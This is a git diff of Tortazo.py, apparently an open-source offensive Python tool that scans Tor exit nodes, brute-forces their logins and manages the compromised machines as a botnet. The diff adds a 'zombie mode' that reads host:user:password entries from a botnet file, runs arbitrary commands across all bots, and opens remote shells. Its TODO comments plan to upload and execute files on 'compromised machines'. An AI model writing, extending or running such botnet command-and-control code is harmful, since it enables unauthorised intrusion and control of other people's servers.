@@ -1,14 +1,33 @@
 # coding=utf-8
+'''
+Created on 22/01/2013
+@author: Adastra
+Tortazo.py
+
+Tortazo is free software; you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation version 2 of the License.
+
+Tortazo is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with Tortazo; if not, write to the Free Software
+Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
+'''
 
 from plumbum import cli, local
 import logging as log
 from time import gmtime, strftime
 import ftplib
-import os
-from core.tortazo.CommandAndControl import CommandAndControl
 from core.tortazo.Discovery import Discovery
 from core.tortazo.WorkerThread import WorkerThread
+from core.tortazo.BotNet import BotNet
 import Queue
+from stem.util import term
+import logging as log
 
 #  ████████╗ ██████╗ ██████╗ ████████╗ █████╗ ███████╗ ██████╗ 
 #  ╚══██╔══╝██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗╚══███╔╝██╔═══██╗
@@ -25,14 +44,21 @@ import Queue
 #	Author: Adastra.
 #	http://thehackerway.com
 #
-#	TODO:
+#	TODO IN V1.0:
 #
 #	- Use combinators if the passfile is not issued, check itertools module.
-#	- Check the Fabric library for Botnet C&C
+#   - Check the "open-shell" feature. Try with invalid values, a long list of bots, etc.
+#	{-} Check the Fabric library for Botnet C&C
 #	- Testing and Doc.
 #   - NMAP Scripting output! Include this in the final report and include the nickname of the scanned exitnode, not just the IP Address.
-#   - When filter by fingerprint and use the local descriptors, the filter is not working as expected. Check it!
+#   {-} When filter by fingerprint and use the local descriptors, the filter is not working as expected. Check it!
+#   - GeoLocation, for example using: http://www.melissadata.com/lookups/iplocation.asp?ipaddress=46.17.138.212
 #
+#   TODO IN V1.1:
+#   - PyNessus integration in the Discovery Module.
+#   - Gather information about SNMP Devices.
+#   - Format reports for Nmap, Shodan, Nessus and SNMP. (Not just an .txt file, create an HTML, XML and probably JSON files)
+#   - Upload and execute files to the compromised machines using SFTP and FTP.
 
 class Cli(cli.Application):
     '''
@@ -46,6 +72,7 @@ class Cli(cli.Application):
     useMirror = cli.Flag(["-d", '--use-mirrors'], help="Use the mirror directories of TOR. This will help to not overwhelm the official directories")
     useShodan = cli.Flag(["-s", '--use-shodan'], help="Use ShodanHQ Service. (Specify -k/--shodan-key to set up the file where's stored your shodan key.)")
     useCircuitExitNodes = cli.Flag(["-c", "--use-circuit-nodes"], help="Use the exit nodes selected for a local instance of TOR.")
+
     threads = 1 #Execution Threads.
     # mode = None #Mode: Windows/Linux
     dictFile = None #Dict. file for brute-force attacks.
@@ -56,8 +83,13 @@ class Cli(cli.Application):
     exitNodeFingerprint = None #Fingerprint of the exit-node to attack.
     queue = Queue.Queue() #Queue with the host/open-port found in the scanning.
     controllerPort = '9151'
-    zoombieMode = None
-	
+    zombieMode = None
+    mode = None
+    runCommand = None
+    openShell = cli.Flag(["-o", "--open-shell"], excludes=["--mode"], requires=["--zombie-mode"],  help="Open a shell on the specified host. example: '--open-shell 1' will spawn a new shell on the host defined in line 1 of the 'tortazo_botnet.bot' file")
+
+
+
     @cli.switch(["-n", "--servers-to-attack"], int, help="Number of TOR exit-nodes to attack. Default = 10")
     def servers_to_attack(self, exitNodesToAttack):
         '''
@@ -72,7 +104,7 @@ class Cli(cli.Application):
         '''
         self.threads = threads
 
-    @cli.switch(["-m", "--mode"], cli.Set("windows", "linux", case_sensitive=False), mandatory=True, excludes=["--zoombie-mode"] , help="Filter the platform of exit-nodes to attack.")
+    @cli.switch(["-m", "--mode"], cli.Set("windows", "linux", case_sensitive=False),  excludes=["--zombie-mode"] , help="Filter the platform of exit-nodes to attack.")
     def server_mode(self, mode):
         '''
         Server Mode: Search for Windows or Linux machines.
@@ -121,22 +153,48 @@ class Cli(cli.Application):
         '''
         self.controllerPort = controllerPort
 	
-    @cli.switch(["-z", "--zoombie-mode"], str, help="This option reads the commandandcontrol* files generated from previous scans. Allows to send commands parallely over all the compromised hosts.")
-    def zoombie_mode(self, zoombieMode):
+    @cli.switch(["-z", "--zombie-mode"], str, excludes=["--mode"], help="This option reads the tortazo_botnet.bot file generated from previous successful attacks. Allows to send commands parallely over all the compromised hosts.")
+    def zombie_mode(self, zombieMode):
         '''
-        Zoombie mode to execute commands across the compromised hosts.
+        Zombie mode to execute commands across the compromised hosts.
         '''
-        self.zoombieMode = zoombieMode
+        if zombieMode == None:
+            self.zombieMode = ""
+        self.zombieMode = zombieMode
+
+    @cli.switch(["-r", "--run-command"], str, excludes=["--mode"], requires=["--zombie-mode"],  help='Execute a command across the hosts of the botnet. Requieres the -z/--zombie-mode. example: --run-command "uname -a; uptime" ')
+    def run_command(self, runCommand):
+        '''
+        Command to execute across the compromised hosts.
+        '''
+        self.runCommand = runCommand
 
     def main(self):
+        '''
+        Initialization of logger system.
+        '''
+        self.logger = log
+        if self.verbose:
+            self.logger.basicConfig(format="%(levelname)s: %(message)s", level=log.DEBUG)
+            self.logger.debug(term.format("[+] Verbose mode activated.", term.Color.GREEN))
+        else:
+            self.logger.basicConfig(format="%(levelname)s: %(message)s")
+        self.logger.info(term.format("[+] Process started at " + strftime("%Y-%m-%d %H:%M:%S", gmtime()), term.Color.YELLOW))
         '''
             List and Scan the exit nodes. The function will return an dictionary with the exitnodes found and the open ports.
             THIS PROCESS IS VERY SLOW AND SOMETIMES THE CONNECTION WITH THE DIRECTORY AUTHORITIES IS NOT AVAILABLE.
         '''
-        if self.zoombieMode:
-            control = CommandAndControl(self)
-            control.execute(self.zoombieMode)
-        else:
+
+        if self.zombieMode:
+            '''
+            In zombie mode, The program should read the file named "tortazo_botnet.bot".
+            In that file, every line have this format: host:user:password:nickname
+            Extract every host and then, create a list of bots.
+            '''
+            botnet = BotNet(self)
+            botnet.start()
+
+        elif self.mode is not None:
             discovery = Discovery(self)
             exitNodes = []
             if self.useCircuitExitNodes:
@@ -144,19 +202,20 @@ class Cli(cli.Application):
             else:
                 exitNodes = discovery.listAuthorityExitNodes() #Returns a tuple with IP Addresses and open-ports.
 
-            if exitNodes != None and len(exitNodes) > 0:
+            if exitNodes is not None and len(exitNodes) > 0:
+                for exitNode in exitNodes.items():
+                    self.queue.put(exitNode)
+                #Block until the queue is empty.
+
                 for thread in range(self.threads): #Creating the number of threads specified by command-line.
                     worker = WorkerThread(self.queue, thread, self)
                     worker.setDaemon(True)
                     worker.start()
+                self.queue.join()
+        else:
+            self.logger.info(term.format("[-] The option -m/mode is mandatory (values: windows | linux)", term.Color.RED))
 
-                for exitNode in exitNodes.items():
-                    self.queue.put(exitNode)
-                self.queue.join() #Blocks the main process until the queue is empty.
-
-        log.info("[+] Process finished at "+ strftime("%Y-%m-%d %H:%M:%S", gmtime()))
-
-
+        self.logger.info((term.format("[+] Process finished at "+ strftime("%Y-%m-%d %H:%M:%S", gmtime()), term.Color.YELLOW)))
 if __name__ == "__main__":
     '''
     Start the main program.
